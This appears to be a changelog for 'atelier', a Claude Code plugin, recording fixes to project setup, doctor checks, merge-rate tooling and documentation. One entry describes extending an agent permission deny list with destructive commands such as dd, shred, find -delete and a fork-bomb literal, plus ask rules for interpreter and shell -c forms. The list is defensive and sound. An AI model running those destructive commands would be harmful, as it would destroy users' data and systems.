**Verified locally with 7+ synthetic scenarios:** created / preserved-atelier-managed / preserved-legacy (under `--yes`) for `step_atelier_config_json`; plus within-budget / lines-only-exceed / files-only-exceed / both-exceed / all-exempted-tests / per-project-override / mixed-counted-and-exempt for `atelier-pr-size-check`. All matched the expected verdicts.

**Plugin scope:** mixed.
- Host-OS-layer (do not by themselves require a `plugin.json` bump): `scripts/atelier-pr-size-check`, `scripts/atelier-setup-project`, `install.sh`, `templates/atelier.template.json` (the bundled template — copied at install time, not loaded by Claude Code).
- Plugin-shipped: `agents/reviewer.md`, `agents/pr-author.md`, `skills/pr-flow/SKILL.md`, `skills/auto-merge/SKILL.md`, `commands/setup-project.md`, `templates/settings.template.json`. Plugin patch bump **0.5.8 → 0.5.9** in `.claude-plugin/plugin.json` per PLAN.md §14.2 (plugin-scope behaviour change).

**Meta-irony acknowledged.** This PR is the seed of the rule and the rule does not retroactively apply to its own merge — the gate fires on PRs opened *after* the merge lands. The diff is ~12 files / ~600 lines (heavily concentrated in the new script + the HISTORY entry); built-in exemptions don't apply (no tests / lockfiles / migrations touched). Subsequent PRs answer to the gate the way it's now written.

**Follow-up paths (not in this PR):**
- **Preventive splitting in `task-orchestrator`** — estimate task size from the ROADMAP entry and propose sub-tasks *before* delegating to `implementer`. Requires a sub-task / `blocked_by` chain convention in ROADMAP and is non-trivial; tracked as a future milestone (`M4.x — Task slicing engine`).
- **First-class `slicer` skill / agent** — invoked by `pr-author` on exit 1 from the size check, automatically splits the diff into sub-PRs along the suggested boundaries. Useful only if preventive splitting (above) proves too lossy.
- **Schema validation for `.atelier.json`** — currently the script only checks `jq empty` (valid JSON). A JSON Schema would catch typos like `prSize.maxLine` (singular). Cheap, defer until the first operator hits the bug.

### M7.1.F26 — `/atelier:setup-project` silently preserves a non-atelier-managed `settings.json` — 2026-05-27
**PR:** [#95](https://github.com/AkaLab-Tech/atelier/pull/95)

Discovered during M7.1 dogfood-4 on the operator's `storefront` project. The operator ran `/atelier:setup-project /Users/mike/Work/storefront`; the script reported success and registered the project in `$ATELIER_CONFIG_DIR/projects.json`, but the project's existing `.claude/settings.json` (dated 30-Apr, pre-atelier) was never touched. Net effect from inside an atelier-managed worktree: Claude Code prompted the operator for permission on **every** Bash command (pnpm, git, gh, …), every Edit/Write, and every Read — none of which would have prompted had the template's `defaultMode: "acceptEdits"` plus the worktree-scoped allowlist landed on disk.

Root cause: `scripts/atelier-setup-project` step 3 (`step_settings_json`) returned early as `preserved` whenever the target `.claude/settings.json` existed and `$RECONFIGURE` was false (the typical first-run case for any project not yet registered in `projects.json`). The branch logged a single `sublog` line — easy to miss next to step 4's roadmap-scaffolding noise — and never compared the file against the atelier template, so legacy / hand-rolled / pre-atelier `settings.json` files passed through unmodified.

**Delivered:**

- **`scripts/atelier-setup-project` — new helpers**:
  - `is_atelier_managed_settings <file>`: returns 0 iff the JSON has `.permissions.defaultMode == "acceptEdits"` AND `.permissions.deny` contains `"Bash(git push --force*)"` (a distinctive template marker no operator would write by hand). Robust against operator edits to `.permissions.allow` — those don't touch either signal.
  - `backup_with_timestamp <file>`: copies `<file>` to `<file>.bak.<utc-iso8601>` (e.g. `.bak.2026-05-27T13-56-56Z`) and echoes the backup path on stdout, so callers can log it. Never destructive — `cp`, not `mv`.
- **`scripts/atelier-setup-project` — `step_settings_json` refactored** into three explicit branches:
  - **No target file** → write the instantiated template, `SETTINGS_STATUS=created`.
  - **Target exists, atelier-managed** → preserve silently with `sublog` showing "(atelier-managed)" so operators can see why the file was left alone. `SETTINGS_STATUS=preserved`.
  - **Target exists, NOT atelier-managed** → emit a 3-line `warn` block, then prompt interactively: `Overwrite with current atelier template (existing file will be backed up)? [y/N]`. On `y`: backup with timestamp + overwrite (`SETTINGS_STATUS=updated`). On anything else: preserve (`SETTINGS_STATUS=preserved`). Under `--yes` / `$ATELIER_AUTO`: skip the prompt and preserve with a warning telling the operator to re-run interactively to overwrite — same "never weaken without confirmation" rule as the rest of the script.
- **Reconfigure path** (`[ -f $target ] && $RECONFIGURE`) now also runs `backup_with_timestamp` before `mv "$tmp" "$target"`. Previously it overwrote operator customizations silently on `y` — minor improvement, same protection model.

**Decisions captured:**

- **Heuristic over schema marker.** Considered adding a `_atelier: { version }` top-level field instead. Rejected for v1: (a) it would re-label every existing atelier-managed `settings.json` as "not managed" until the operator re-runs `setup-project`, breaking the very upgrade path this fix enables; (b) Claude Code's tolerance for unknown top-level keys across versions is not guaranteed. The `defaultMode == "acceptEdits"` + `deny` marker heuristic is simple, backward-compatible, and matches what every atelier-instantiated `settings.json` since M4.7 has had on disk. The marker can be added later if a richer signal is ever needed.
- **`Bash(git push --force*)` as the deny-list signal** specifically. Other candidates were `mcp__plugin_atelier_playwright__browser_run_code_unsafe` (newer, M3.4-only — would miss older atelier-managed files) and `Bash(sudo *)` (too common in operator-written denies). The git-push-force entry has been in the template since M2.4, is atelier-specific (operators rarely hand-write it), and is unlikely to be removed in future template revisions.
- **Operator-facing message phrasing.** The prompt explicitly says "existing file will be backed up". Operators won't reflexively answer `y` without that reassurance; removing the fear of data loss is the whole point of the timestamped backup.
- **Backup path next to the original**, not under `/tmp` or `$ATELIER_CONFIG_DIR`. Two reasons: (a) backups stay alongside the file they belong to, so operators looking to restore them by hand find them with `ls .claude/`; (b) `.bak.*` is part of common `.gitignore` patterns most projects already have, so backups don't leak into commits.
- **No automatic removal of `.bak.*` files.** They are operator-recoverable evidence — the script never knows whether they're still useful. Trade-off: long-running atelier projects might accumulate them on each reconfigure. Acceptable until proven friction.

**Plugin scope:** no — `scripts/atelier-setup-project` is a host-OS-layer script symlinked into `~/.local/bin` by `install.sh` (Phase C.1, line ~1203), not plugin-shipped content. `plugin.json` is **not** bumped. Distribution path for the fix: operators re-run `install.sh` (or `git pull` their atelier checkout if installed from a clone) to pick up the new script.

**Spawned follow-up:** none in atelier itself. The dogfood-4 operator's `storefront/.claude/settings.local.json` (accumulated ~168 hand-approved entries pre-fix) is preserved as-is — the fix only addresses `settings.json`, not `settings.local.json`. After this lands, the operator re-runs `/atelier:setup-project` on `storefront`, answers `y` at the new prompt, and the legacy `settings.json` is backed up while the template-instantiated one takes over.

### Docs follow-up — README "Daily use" manual for dogfood prep — 2026-05-26
**PR:** [#94](https://github.com/AkaLab-Tech/atelier/pull/94)

Captured as a follow-up immediately after the ship-path sweep closed (M2.5 → M7.3). Trigger: the operator was about to start dogfooding for the M7.3 observational measurement and wanted a copy-paste-friendly reference *inside README itself*, not just in `docs/`. The long-form M6.2 operator-guide stays as the authoritative walkthrough; the README section is its condensed cheat-sheet.

**Delivered:**
- `README.md` gains a `## Daily use` section between "First time?" and "Already have Claude Code + GitHub set up?". Five numbered steps: setup-project, write task, `task`, inspect, measure (`atelier-measure-merge-rate --sample 10`). Plus "When something doesn't work" cross-link and a Pause / abandon / reset mini-reference.
- Step 5 surfaces the auto-detection defaults so the copy-paste invocation works without extra flags on a properly-installed system.

**Out of scope:**
- No code changes; pure README work.
- Operator guide and troubleshooting doc stay intact.

### M7.3 — Autonomous merge-rate tooling — 2026-05-26
**PR:** [#93](https://github.com/AkaLab-Tech/atelier/pull/93)

PLAN.md §12 Phase 7 M7.3 ships the *tooling* for the Phase 7 ship gate (≥80% autonomous on a sample of 10 atelier-driven tasks). The actual measurement is observational and waits for ≥10 atelier-driven PRs to merge on a live dogfood project — that result is **not** claimed by this PR.

**Delivered:**
- `scripts/atelier-measure-merge-rate` (bash, ~200 lines). Flags `--sample N` (default 10), `--repo OWNER/NAME` (auto-detect), `--author HANDLE` + `--reviewer HANDLE` (auto-detected from `GH_CONFIG_DIR=$ATELIER_CONFIG_DIR/gh/{author,reviewer}`), `--threshold PCT` (default 80). Markdown stdout, exit 0/1/2.
- Classification heuristic — autonomous iff (a) PR author == `--author`, (b) ≥1 `APPROVED` review from `--reviewer`, (c) no `COMMENTED`/`CHANGES_REQUESTED` reviews or top-level comments from foreign accounts.
- Symlinked from `install.sh:phase_c_1_setup_project_helper` alongside the other atelier-* helpers.
- `docs/measurements/autonomous-merge-rate.md` — methodology, classification rules, limits of the heuristic (operator session restarts, verbal direction in-chat — invisible to GitHub data), how to interpret PASS/FAIL, why the smoke run reports 0% on the M2.5→M7.3 maintenance PRs (expected — none were atelier-driven).
- `docs/operator-guide.md` Reference table + `README.md` Other docs list the new command + methodology doc.

**Tests:** smoke run on `AkaLab-Tech/atelier` (last 10 merged PRs) reported `0 / 10 autonomous` with informative per-row reasons (`no approval from Miguelslo27` for each). The 0% result validates that the tool doesn't fabricate passing data; the per-row reasons validate that the heuristic discriminates correctly between criteria.

**Phase 7 closure (deferred):** the formal ship-gate measurement requires ≥10 atelier-driven PRs on a dogfood project (e.g. `~/Work/atelier-dogfood-4`). When those exist, run `atelier-measure-merge-rate --sample 10 --repo <dogfood-repo>` and record the result in a sibling file under `docs/measurements/`. That observation — not any further milestone — closes Phase 7 and v1.

### M6.4 — Symptom-indexed troubleshooting doc — 2026-05-26
**PR:** [#92](https://github.com/AkaLab-Tech/atelier/pull/92)

PLAN.md §12 Phase 6 M6.4 deliverable. Companion to M6.2's operator guide: when the happy path breaks, this is where the operator looks first. Symptom-first format because operators search for what they see on screen, not the underlying internals.

**Delivered:**
- `docs/troubleshooting.md` (~200 lines). 13 named failure modes covering both setup-time and runtime problems, framed by "always first: run the doctor", "when all else fails" (5-step capture + bug-report path), and a "reset everything" nuclear-option section. Both dogfood-1 findings cited in the ROADMAP are covered verbatim — #11 (same-identity self-approval) and B (permission-cache mis-alignment after worktree reset).
- `docs/operator-guide.md`: "If something goes wrong" link replaces the "coming soon" placeholder.
- `README.md`: "Other docs" section now lists `troubleshooting.md` first.
- `install.sh:print_first_steps`: adds `docs/troubleshooting.md` to the docs list printed at end of install.

**Coverage by category:**
- Setup-time (4): `task: command not found`, install.sh Phase A failures, same-GitHub-identity prompt loop, claude-vs-atelier config mix-up.
- Runtime (9): picker not firing, missing `projects.json`, `pnpm minimum-release-age` rejects, hook blocks (5 hooks named individually), auto-merge holds, reviewer approval downgraded, blocked GitHub issue path, deny-list re-evaluation post-reset, git-wt drift, `atelier-hooks-version` refresh notice.

**Out of scope:**
- Screenshots / video — text-only for v1.
- Automated bug-report CLI — operators capture state manually per the "when all else fails" steps.

### M6.2 — Jr-friendly operator guide — 2026-05-26
**PR:** [#91](https://github.com/AkaLab-Tech/atelier/pull/91)

PLAN.md §12 Phase 6 M6.2 deliverable. Closes the "can a Jr clone, install, and run a full task cycle from only the operator guide?" acceptance.

**Delivered:**
- `docs/operator-guide.md` (~210 lines, plain English). Six numbered steps from `git clone` to `task`. Honest about friction (two GitHub accounts, ~30 min first install). Reference table for the four shell commands and per-project files. Recovery + uninstall covered. Jargon audit: zero `worktree`, `commit`, `merge`, `lint`, `typecheck`. Single `branch` mention in the intro explicitly framing what the operator doesn't need to know.
- `README.md` restructured as an entry point: brief intro + prominent link to the operator guide + retained terse plugin-only install for already-configured users + cross-links to PLAN.md, ROADMAP.md, dogfood-guide.md.
- `install.sh:print_first_steps` updated to list `docs/operator-guide.md` as the recommended docs entry (replacing the misleading "README.md (operator guide)" line — README never actually contained the operator guide).

**Follow-ups:**
- M6.4 (troubleshooting doc) will replace the guide's "coming soon" link with a real reference.
- Screenshots / video — text-only for v1; revisit if Jr feedback says the steps need visual aids.

### M5.3 — `task` alias resolves project from cwd — 2026-05-26
**PR:** [#90](https://github.com/AkaLab-Tech/atelier/pull/90)

The `task()` shell function previously invoked `claude /next-task` against whatever directory the operator happened to be in, with no awareness of registered projects. This entry adds project resolution.

**Delivered:**
- `scripts/atelier-task-resolve` (new binary, symlinked into `~/.local/bin` by `install.sh`). Longest-prefix match against `$ATELIER_CONFIG_DIR/projects.json`; falls back to an `fzf` picker sorted by `setupCompleted` desc; surfaces an actionable error when no projects are registered or fzf is missing.
- `task()` in the install.sh shellrc heredoc rewritten to call the resolver, `cd` into the chosen project, then invoke `claude /next-task`. `atelier-hooks-version` bumped 1 → 2 so existing operators get the new `task()` body automatically on the next `install.sh` re-run (M7.1.F7c contract).

**Tests:** 6 scenarios in `/tmp/test_m5_resolver.sh` covering registry-absent, exact match, subdir match, no-fzf fallback, empty registry, and nested projects (longest-prefix). All passed first try.

**Follow-ups:**
- `lastTask` timestamp on registry entries — defer until the picker wants to sort by recency.

### M5.2 — `/setup-project` full bootstrap — 2026-05-26
**PR:** [#90](https://github.com/AkaLab-Tech/atelier/pull/90)

Audit during the ship-path sweep confirmed that `/setup-project` (delivered incrementally through M2.3, M4.16, M4.19) already covers the full M5.2 deliverable: writes `.claude/settings.json` from the template, `ROADMAP.md` + `IN_PROGRESS.md` + `HISTORY.md`, project `.claude/CLAUDE.md`, project `.npmrc` (pnpm guardrails per PLAN.md §4), `.gitignore` entries, plus the `step_record_setup` registry write. This entry formally closes the milestone — no functional change beyond the M5.1 schema addition (the `name` field).

**Delivered (already in place from M2.3/M4.16/M4.19, formally closed here):**
- `.claude/settings.json` instantiation from `$ATELIER_CONFIG_DIR/templates/settings.template.json` with `<worktree>` substitution.
- `ROADMAP.md`, `IN_PROGRESS.md`, `HISTORY.md` skeletons.
- Project `.claude/CLAUDE.md` (M4.19 interview + codebase-scan modes).
- `.npmrc` with `ignore-scripts`, `minimum-release-age`, `audit-level` (PLAN.md §4 guardrails).
- `.gitignore` entries.
- `projects.json` registry write via `step_record_setup`.

### M5.1 — Project registry at `$ATELIER_CONFIG_DIR/projects.json` — 2026-05-26
**PR:** [#90](https://github.com/AkaLab-Tech/atelier/pull/90)

Audit during the ship-path sweep found `step_record_setup` had been writing to `projects.json` since M2.3 with fields `setupCompleted` + `setupVersion`. This entry formally closes the milestone and adds the `name` field required by the M5.3 picker.

**Delivered:**
- `name` field (basename of the project path) added to `step_record_setup`'s jq merge in `scripts/atelier-setup-project`. New shape: `{ name, setupCompleted, setupVersion }`. Old entries without `name` keep working — the M5.3 picker falls back to `key | split("/") | last` when reading them.
- Already-in-place infrastructure (M2.3) formally documented here: idempotent `is_configured()` probe, create-or-update semantics in `step_record_setup`, lookup at `$ATELIER_CONFIG_DIR/projects.json`.

**Follow-ups:**
- `lastTask` timestamp — defer until the picker (or any other consumer) needs it.

### M7.1.F14 — Unauthenticated GitHub API fallback for plugin-drift upstream probe — 2026-05-26
**PR:** [#89](https://github.com/AkaLab-Tech/atelier/pull/89)

dogfood-3 surfaced doctor's plugin-drift checks failing with 404 when the source repo was private and the operator's atelier-author identity lacked org membership. Resolved with a four-step probe chain in `fetch_upstream_version()` that falls back to anonymous GitHub API when the authenticated probe returns nothing. The original ROADMAP design (read upstream version from the local marketplace clone) was rejected after inspection — the `akalab-tech` marketplace is a pointer-style catalog without per-plugin version fields.

**Delivered:**

- `scripts/atelier-doctor` gains `fetch_upstream_version <repo>` — tries `gh api releases/latest` → `gh api tags` → unauth `curl releases/latest` → unauth `curl tags`. First non-empty wins. Unauth probes share GitHub's 60-req/hour anonymous quota; doctor emits at most two per session.
- `check_plugin_drift` refactored to call the helper. SKIP message rewritten from the vague "(upstream check failed)" to "(upstream check failed — tried gh auth + unauth curl; repo may be private without anon access, or GitHub rate-limited)".
- `commands/doctor.md` gains a "Plugin-drift probe chain (M7.1.F14)" section documenting the four steps so operators understand the ↷ message.

**Acceptance** (revised — supersedes ROADMAP's original "still reports ✓"):

> Running `/atelier:doctor` on a system where the authenticated `gh` identity gets 404 for `releases/latest` but the source repo is **public** still reports `✓ atelier <version> (up to date)` — the unauth `curl` fallback succeeds. If the repo is genuinely private (no anon access), doctor reports `↷` with an informative message; never fabricates `✓`.

The ROADMAP's literal acceptance ("still reports ✓ for private repos without API access") was rejected as inhonest — the binary refuses to claim "up to date" without evidence.

**Tests:** three worktree scenarios — (1) normal `gh` access reports ✓ for both plugins (baseline preserved); (2) `gh` stubbed to fail on `releases/latest` + `tags` with real `curl` against public api.github.com reports ✓ for both plugins (F14 trigger fixed); (3) both `gh` and `curl` stubbed to fail reports ↷ with the documented SKIP message. All three passed first try.

**Follow-ups:**

- `check_git_wt_drift` (separate function, `commits/main` endpoint) untouched. Same robustness pattern could apply if `git-wt` ever moves to a private repo.
- Permanent test fixture for the probe chain belongs in M1.7 self-CI scope.

### M7.1.F7c — Versioned shellrc block with auto re-injection on `install.sh` re-run — 2026-05-26
**PR:** [#88](https://github.com/AkaLab-Tech/atelier/pull/88)

Captured 2026-05-25 during F7b live validation: operators upgrading between atelier versions silently kept stale shellrc blocks because `phase_c_1_shellrc_hooks` skipped on sentinel detection without checking content. This PR closes the upgrade-friction gap with an explicit version line inside the block and version-aware re-injection.

**Delivered:**

- `install.sh:phase_c_1_shellrc_hooks` reads `# atelier-hooks-version: N` from any existing block. Outcomes by case: missing/older → strip-and-reinject with `→ refreshing atelier shellrc block (vX → vY)` log; equal → `step_skip "already present (vN)"`; newer → `warn` and leave alone. Strip uses `awk` between start/end sentinels with atomic tempfile-then-mv.
- Heredoc gains `# atelier-hooks-version: 1` directly under the start sentinel plus a one-line docstring instructing future maintainers to bump the integer when editing block contents.
- Defensive guard: if the start sentinel is present but the end sentinel is missing (corrupted state), the function refuses to strip and warns the operator to repair manually — never removes more than intended.
- Defensive guard: if the existing version is *higher* than `current_version`, the function leaves the block alone and warns — protects against an older `install.sh` downgrading a block written by a newer one.

**Tests:** harness at `/tmp/test_f7c.sh` (not checked in) sourced the function definitions from `install.sh` and ran five fixtures covering fresh install, legacy block (no version line), current version (v1), corrupted block (missing end sentinel), and future version (v999). All five matched expected behavior on the first run.

**Follow-ups:**

- The first integer is `1`. Anyone editing the BLOCK heredoc must bump it to `2` and the upgrade auto-propagates.
- A permanent test fixture in `tests/` belongs in M1.7 self-CI scope; not blocking.

### M7.1.F15 — Document per-check independence in `/atelier:doctor` — 2026-05-26
**PR:** [#87](https://github.com/AkaLab-Tech/atelier/pull/87)

Captured during M7.1 dogfood-3 (2026-05-25) alongside F14 — the operator's first doctor run was cascade-cancelled when a parallel `gh api` call 404-ed. F23 (PR #83) refactored the slash command into a single bash binary, by construction eliminating the parallel-tool-call cascade. This PR closes F15 at the documentation layer: the per-check independence invariant is now spelled out in both the command and the binary, so a future contributor adding a new check can find the contract before introducing a regression.

**Delivered:**
- `commands/doctor.md`: new "Per-check independence (M7.1.F15)" section listing three guarantees — sequential execution (no parallel Claude Code tool calls), local failures (`set -e` intentionally off, each check handles errors internally), independent status markers (`✗` or `–` on one row says nothing about the others).
- `scripts/atelier-doctor`: contract comment above the `# ---------- checks ----------` block. New checks must handle errors with `2>/dev/null` + conditional logic, never call `exit`, never rely on `set -e`, and always push one status line via `push_plugin`/`push_external`/`push_host`.

**Tests:** `env -i PATH=/usr/bin:/bin scripts/atelier-doctor` produced a complete report (10 lines: 4 ✓ / 4 – / 2 ✗) with exit code 1 even when `gh`, `jq`, `claude`, and `docker` were absent. This is F15's acceptance criterion (full report on intentional failure) verified empirically.

**Follow-ups:**
- A permanent CI guard for the per-check independence property belongs in M1.7 self-CI scope; not blocking.

### M2.5 — Extend static permission matrix with destructive-command synonyms — 2026-05-25
**PR:** [#86](https://github.com/AkaLab-Tech/atelier/pull/86)

Captured during the design conversation that converged on a three-layer defense-in-depth permission model. Layer 1 (the static `settings.template.json` matrix) had clear gaps for destructive-command synonyms an agent could emit — equivalent destructive behavior under non-matching syntax. This entry extends layer 1 with those gaps before any layer-3 work (deferred to M2.6) starts, so the cheap deterministic layer carries its full weight.

**Delivered:**
- `templates/settings.template.json` `deny`: low-level destructive utilities (`dd`, `shred`, `truncate -s 0`), find-based deletion variants (`find ... -delete`, `find ... -exec rm`), fork-bomb literal, `gh api --method <verb>` synonyms (parallel to existing `-X <verb>`), `gh api -X PUT`.
- `templates/settings.template.json` `ask`: arbitrary-code interpreters (`node/python/perl/ruby -e or -c`), composition shells (`bash/sh/zsh -c`), `* | sudo *` pipes.
- `PLAN.md` §3: defense-in-depth paragraph extended with a forward-reference to layer 3 (deferred to M2.6).
- `PLAN.md` §11 v2.3: refined as "layer 3 of three", citing Anthropic's ~17% false-negative rate for native auto-mode as the rationale for layers 1+2 carrying primary responsibility.
- `ROADMAP.md`: opens M2.6 spike — native `auto` permission mode vs custom LLM-backed hook.

**Tests:** `python3 -m json.tool templates/settings.template.json` validates; `grep -E "Bash\(dd|shred|node -e|bash -c" templates/settings.template.json` returns the new patterns.

**Follow-ups:**
- M2.6 (Medium Priority) — spike to decide A/B/C for layer 3.
- Shell-redirection forms and context-dependent destinations remain layer-3 territory by design (not closed by this work).

### M7.1.F25 — `/atelier:doctor` adds explicit Stop rule to defeat conversational language inertia — 2026-05-25
**PR:** _pending_

Surfaced during M7.1 dogfood-3 verification of v0.5.7, immediately after F24 cleaned up the stale check. The operator ran `/atelier:doctor` and got the correct binary output, but the LLM appended a Spanish commentary block AFTER the binary's final line:

```
All checks passed. atelier is up to date.

  Todo en orden. El único ítem marcado con – es el .npmrc del proyecto, lo cual es esperado dado que este proyecto aún
  no tiene dependencias npm configuradas — se creará automáticamente cuando ejecutes /atelier:setup-project.
```

That contradicts `commands/doctor.md`'s contract: *"Pass it through verbatim. Do not rewrap, summarize, or commentate."* — present in v0.5.6/v0.5.7 but apparently insufficient to override the model's tendency to continue the conversational thread.

**Root-cause diagnosis (executed with the operator)**

Sources checked and ruled out, in order:

| Source | Check | Result |
|---|---|---|
| Operator's personal `~/.claude/CLAUDE.md` leaking into atelier sessions | `atelier` shell function exports `CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR` — Claude Code does not fall back to `~/.claude/` | ruled out |
| Project-level `~/Work/<project>/CLAUDE.md` or `.claude/CLAUDE.md` | `find ~/Work/atelier-dogfood-4 -name 'CLAUDE.md'` returned empty | ruled out |
| `$ATELIER_CONFIG_DIR/CLAUDE.md` | `find ~/.claude-work -name 'CLAUDE.md'` returned only plugin-cache copies (none top-level) | ruled out |
| `$ATELIER_CONFIG_DIR/settings.json` `customInstructions` | only contains `enabledPlugins` / `theme` / `extraKnownMarketplaces` | ruled out |
| `~/.claude-work/templates/project-claude.md.template` | generic "managed by atelier" stub, no language directive | ruled out |
| Plugin's own `CLAUDE.md` + `operator-rules.md` + agents + commands + hooks | `grep -rin 'español\|spanish\|idioma'` across plugin cache returned zero language directives | ruled out |

That leaves **the LLM's intrinsic conversational-language inertia** — when prior turns are in Spanish, the model defaults to responding in Spanish, including when the slash command's docstring is in English. No configuration file is at fault; the dotfile-isolation between atelier and personal Claude is working correctly.

**Fix — strengthen the verbatim rule positionally and explicitly**

- **`commands/doctor.md` — new `## Stop rule (M7.1.F25)` section** inserted between "What to do" and "Why the bash binary…". Emphatic and absolute: "Your turn ends the instant you finish emitting the binary's last line of stdout. After that line, output NOTHING — no commentary, no translation, no summary, no interpretation… This rule overrides any default conversational behavior."
- **Existing Hard rules list** — the "Never rewrap, summarize, or substitute language" bullet now explicitly references the Stop rule and notes "conversational language inertia is not an exception".
- **`.claude-plugin/plugin.json`** bumped **0.5.7 → 0.5.8** (patch — instruction-discipline fix in plugin scope per PLAN.md §14.2).

**Decisions captured:**

- **Strengthen instructions, do NOT add a guard to the binary.** Considered adding a sentinel line ("END OF REPORT — DO NOT ADD ANYTHING AFTER THIS LINE") inside the binary's output. Rejected: the sentinel would (a) leak into the operator's view as unwanted decoration and (b) reinforce the wrong contract surface — the binary's contract is exit code + stdout, not human signaling. The model-side discipline is where the fix belongs.
- **Position matters: rule near the top, not buried in "Hard rules".** v0.5.6/v0.5.7 already had a "Hard rules" list at the bottom that says "Never rewrap, summarize…", but the model still appended commentary. Hypothesis: rules at the END of a long file have weaker pull on a model deciding how to finish its turn than rules at the BEGINNING of the file (which it scans before deciding what to do). The new `## Stop rule` section is in position 3 of the file (after frontmatter + "What to do") to maximize attention weight.
- **Explicit override of language inertia.** The Stop rule names the specific failure mode ("regardless of the conversational language of prior turns") so the model recognizes the override applies even when it would normally prefer to match the operator's idiom.
- **Test cannot be fully automated.** Whether the model follows the rule is a model-behavior assertion. Pre-merge test = textual diff confirms the section was added correctly. Post-merge test = operator re-runs `/atelier:doctor` after updating, observes silence after the binary's final line.

**Test plan:**

- [x] `commands/doctor.md` Stop rule section present in position 3 of the file.
- [x] Hard rules bullet updated to reference Stop rule + language inertia.
- [x] `jq empty .claude-plugin/plugin.json` passes at version `0.5.8`.
- [ ] **(post-merge)** Operator runs the v0.5.8 update sequence (`git pull` on dotfiles + `/plugin update` inside atelier + restart) and re-runs `/atelier:doctor` from a session with Spanish-language prior turns. Expected: the binary's output is the LAST text emitted; no Spanish commentary follows.

### M7.1.F24 — `/atelier:doctor` removes stale `check_atelier_config_json` (legacy path + wrong schema) — 2026-05-25
**PR:** _pending_

Surfaced immediately after v0.5.6's F23 refactor stabilized the doctor permission-gate loop. During M7.1 dogfood-3 verification, the operator ran the new binary on a clean install (post-uninstall `--purge`) and got one persistent `✗`:

```
✗ ~/.claude/.atelier-config.json missing setupCompleted or setupVersion
```

Investigation revealed the check itself is broken — and has been broken since the M5.0.1 dual-config-dir refactor, but was masked in most environments because the legacy file had been wiped along with installs.

**Root cause — two compounded errors in `check_atelier_config_json`:**

1. **Wrong path.** The check reads `$HOME/.claude/.atelier-config.json`, which was the pre-M5.0.1 location. Since M5.0.1 introduced `$ATELIER_CONFIG_DIR` and the env-var lookup chain, `atelier-setup-project` writes to `$ATELIER_CONFIG_DIR/projects.json` (= `~/.claude-work/projects.json` in this operator's environment), confirmed at `scripts/atelier-setup-project:267` (`CONFIG_FILE="$ATELIER_CONFIG_DIR/projects.json"`).
2. **Wrong schema.** The check expects top-level `.setupCompleted` and `.setupVersion`. The actual schema is nested per project: `.projects[<path>].setupCompleted` and `.projects[<path>].setupVersion`. This schema is consistent across both the legacy file (when present) and the current `projects.json` — the schema never changed, only the path did.
3. **Wrong remediation.** The check's fix block suggested `/atelier:setup-project --reconfigure`. Even running that command writes to `~/.claude-work/projects.json` (current path), not to `~/.claude/.atelier-config.json` (check path) — so the `✗` would have persisted forever after every `--reconfigure`.

The operator's environment had a legacy `~/.claude/.atelier-config.json` file (281 bytes, dated 2026-05-20) containing valid records for `atelier-dogfood-3` and `atelier-dogfood-4` — with the nested schema. That file survived `atelier-uninstall --purge` because uninstall by design does not touch `~/.claude/` (the operator's personal Claude config dir, distinct from `$ATELIER_CONFIG_DIR`). So the check saw a file it didn't expect, read it with the wrong schema, and reported a `✗` for fields that exist nested but not at top level.

**Delivered:**

- **`scripts/atelier-doctor`** — `check_atelier_config_json` function and its call site removed entirely (lines 214-229 and the invocation at line 387 in v0.5.6). The check covered no real invariant: per-project setup state is visible via `/atelier:status` from inside a project, and the host install's health is already validated by `check_atelier_config_dir` (`installStatus: complete`).
- **`commands/doctor.md`** — description frontmatter no longer lists `.atelier-config.json` among auxiliary host checks. Reference output block removes the corresponding line.
- **`.claude-plugin/plugin.json`** bumped **0.5.6 → 0.5.7** (patch — bug fix in plugin scope per PLAN.md §14.2).

**Decisions captured:**

- **Remove rather than repurpose.** Three alternatives considered: (A) delete the check, (B) repoint it at `$ATELIER_CONFIG_DIR/projects.json` and report number of projects registered (informational only, never fail), (C) keep the `✗` but rewrite the message to mark legacy state. (A) chosen — the check had no underlying invariant. Adding a new "projects registered" informational check (B) would have introduced a check whose definition of "healthy" is unclear ("zero projects = unhealthy?" — no, that's just a fresh install). The host-install invariant is already covered by `check_atelier_config_dir`.
- **Legacy file cleanup is out of scope for this PR.** The operator manually removed `~/.claude/.atelier-config.json` during diagnosis. Sweeping legacy paths automatically belongs to a future `atelier-uninstall` enhancement (provisionally **F25** if a clean-install audit surfaces it as worth doing).
- **Documentation hygiene.** Each binary-check removed must also remove its mention from the slash command's `description` frontmatter and any reference-output block. Future check removals should follow the same three-file pattern (`scripts/atelier-doctor` + `commands/doctor.md` description + reference output).

**Test plan (executed pre-merge):**

- [x] `bash -n scripts/atelier-doctor` syntax check passes.
- [x] Function definition and call site both removed (grep verifies no stragglers).
- [x] `jq empty .claude-plugin/plugin.json` passes at version `0.5.7`.
- [x] `commands/doctor.md` description frontmatter no longer references `.atelier-config.json`.
- [x] Reference output in `commands/doctor.md` no longer shows the removed line.
- [ ] **(post-merge)** Operator runs `claude plugin update atelier@akalab-tech` to v0.5.7 + `git pull` on dotfiles + restart Claude + retries `atelier /atelier:doctor`. Expect: same 9 checks as v0.5.6 (minus the removed one) = 9 total host-check lines, exit code 0, "All checks passed. atelier is up to date."

### M7.1.F23 — `/atelier:doctor` architectural refactor: move all check logic into a bash binary — 2026-05-25
**PR:** _pending_

Operator pushback during M7.1 dogfood-3 v0.5.5 doctor retry made the architectural problem explicit: each narrative patch (F16 → F16b → F20 → F21 → F22) closed a different Claude Code permission gate, but each fix was at the LLM-instruction layer — a behavior steering, not a mechanical constraint. The LLM could ignore the guidance and re-introduce compound shell expressions, file-read interception, env-prefix mismatches, etc. **Five patches in, the operator asked: "does this DEFINITIVELY fix F22?"** The honest answer was no — narrative-level fixes don't ENFORCE anything; they nudge.

**The architectural fix:** move every check's logic into a bash binary the LLM never reads. The slash command collapses to one allowlisted invocation (`Bash(atelier-doctor:*)`). Compound shell operators, file reads, env-var prefixes — all happen INSIDE the binary, never touching Claude Code's permission system.

**Delivered:**

- **`scripts/atelier-doctor` (new, ~310 lines)** — full bash binary implementing all 10 checks from the previous narrative:
  1. Plugin drift `atelier@akalab-tech` vs `gh api repos/AkaLab-Tech/atelier/releases/latest`.
  2. Plugin drift `claude-roadmap-tools@akalab-tech` (same shape).
  3. SHA drift `git-wt` vs `gh api repos/AkaLab-Tech/git-wt/commits/main`.
  4a. Legacy atelier hooks in `~/.claude/settings.json`.
  4b. `git-wt` binary on `PATH`.
  4c. Shellrc hooks sentinel in `~/.zshrc` / `~/.bashrc`.
